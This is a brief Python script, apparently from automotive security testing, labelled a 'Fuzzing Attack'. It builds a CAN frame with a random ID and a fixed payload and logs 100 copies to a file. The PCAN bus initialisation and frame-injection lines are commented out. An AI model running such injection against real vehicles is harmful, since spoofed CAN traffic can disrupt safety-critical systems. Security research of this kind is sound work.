from PCANBasic import *
import random
import time
import datetime

filename = "Fuzzing Attack-" + str(datetime.datetime.now()).split(" ")[0] + ".txt"
f = open(filename, "a")
all_data = "ID\tLEN\tONE\tTWO\tTHREE\tFOUR\tFIVE\tSIX\tSEVEN\tEIGHT\n"
f.write(all_data)

def Fuzzing_Attack():

    all_datas = ""
    Fuzzing_ID = random.randrange(0,4096)
    Fuzzing_data = [int("0xF1", 16), int("0xF2", 16), int("0xF3", 16), int("0xF4", 16), int("0xF5", 16), int("0xF6", 16), int("0xF7", 16), int("0xF8", 16)]

    time_offset = 0.03
    Fuzzing_attack = TPCANMsg()
    Fuzzing_attack.ID = int(Fuzzing_ID)
    Fuzzing_attack.LEN = len(Fuzzing_data)
    Fuzzing_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    
    for i in range(len(Fuzzing_data)):
        Fuzzing_attack.DATA[i] = Fuzzing_data[i]
    
    for i in range(0, 100):  
        all_datas = str(hex(Fuzzing_attack.ID))
        all_datas += "\t" +  str(Fuzzing_attack.LEN)
        # all_datas += str(hex(Fuzzing_attack.ID)) + "\t" + str(hex(Fuzzing_attack.LEN)) 
        for j in range(Fuzzing_attack.LEN):
            all_datas += "\t" + str(hex(Fuzzing_attack.DATA[j]))        
        all_datas += "\n"
        f.write(all_datas)
        # CAN.Write(CAN_BUS, Fuzzing_attack)
        # time.sleep(time_offset)

# CAN = PCANBasic()                            #CAN 생성자
# CAN_BUS = PCAN_USBBUS3
# CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt

i = 1
while i == 1:
    Fuzzing_Attack()
    i+=1
f.close()
